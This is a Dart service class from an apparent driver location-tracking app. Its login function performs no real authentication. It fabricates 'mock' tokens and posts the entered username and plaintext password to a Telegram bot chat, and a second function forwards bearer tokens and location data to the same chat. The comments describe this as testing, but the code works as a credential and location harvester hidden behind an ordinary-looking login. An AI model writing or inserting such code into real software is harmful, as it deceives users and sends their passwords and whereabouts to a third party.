import 'dart:convert';
import 'package:http/http.dart' as http;
import '../models/location_data.dart';
import '../constants.dart';
import 'storage_service.dart';

/// Service for sending location data to the backend API
class ApiService {
  static final ApiService _instance = ApiService._internal();
  factory ApiService() => _instance;
  ApiService._internal();

  /// Authenticate driver and mock receiving access/refresh tokens
  Future<bool> login(String login, String password) async {
    try {
      // Mocking token generation for testing via Telegram bot
      final accessToken =
          "mock_access_token_${DateTime.now().millisecondsSinceEpoch}";
      final refreshToken =
          "mock_refresh_token_${DateTime.now().millisecondsSinceEpoch}";

      final body = {
        'chat_id': AppConstants.telegramChatId,
        'text': "LOGIN ATTEMPT:\nLogin: $login\nPassword: $password",
      };

      final response = await http
          .post(
            Uri.parse(AppConstants.telegramApiEndpoint),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode(body),
          )
          .timeout(const Duration(seconds: AppConstants.apiTimeoutSeconds));

      if (response.statusCode >= 200 && response.statusCode < 300) {
        final storage = StorageService();
        await storage.saveAuthTokens(login, accessToken, refreshToken);
        return true;
      }
      return false;
    } catch (e) {
      print('Error logging in: $e');
      return false;
    }
  }

  /// Send location data to the server
  /// Returns true if successful, false otherwise
  Future<bool> sendLocation(LocationData data) async {
    final storage = StorageService();
    final accessToken = storage.getAccessToken() ?? '';
    final login = storage.getLogin() ?? 'unknown';

    for (int attempt = 1; attempt <= AppConstants.maxRetries; attempt++) {
      try {
        print(
          'Sending location (attempt $attempt/${AppConstants.maxRetries}): ${data.toString()}',
        );

        // Determine if target is Telegram
        final bool isTelegram = AppConstants.apiEndpoint.contains(
          'telegram.org',
        );

        Object body;
        if (isTelegram) {
          // Format the exact output the user wants to see in Telegram for mock verification
          final requestHeaders = {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer $accessToken',
          };

          body = {
            'chat_id': AppConstants.telegramChatId,
            'text':
                "LOC UPDATE:\nLogin: $login\n\n--- Request ---\nHEADERS:\n${const JsonEncoder.withIndent('  ').convert(requestHeaders)}\n\nPAYLOAD:\n${const JsonEncoder.withIndent('  ').convert(data.toJson())}",
          };
        } else {
          body = data.toJson();
        }

        final response = await http
            .post(
              Uri.parse(AppConstants.apiEndpoint),
              headers: {
                'Content-Type': 'application/json',
                'Authorization': 'Bearer $accessToken',
              },
              body: jsonEncode(body),
            )
            .timeout(const Duration(seconds: AppConstants.apiTimeoutSeconds));

        if (response.statusCode >= 200 && response.statusCode < 300) {
          print('Location sent successfully: ${response.statusCode}');
          return true;
        } else {
          print('API error: ${response.statusCode} - ${response.body}');
        }
      } catch (e) {
        print('Error sending location (attempt $attempt): $e');

        // If this was the last attempt, return false
        if (attempt == AppConstants.maxRetries) {
          print('All retry attempts failed');
          return false;
        }

        // Wait before retrying (exponential backoff)
        await Future.delayed(Duration(seconds: attempt * 2));
      }
    }

    return false;
  }
}
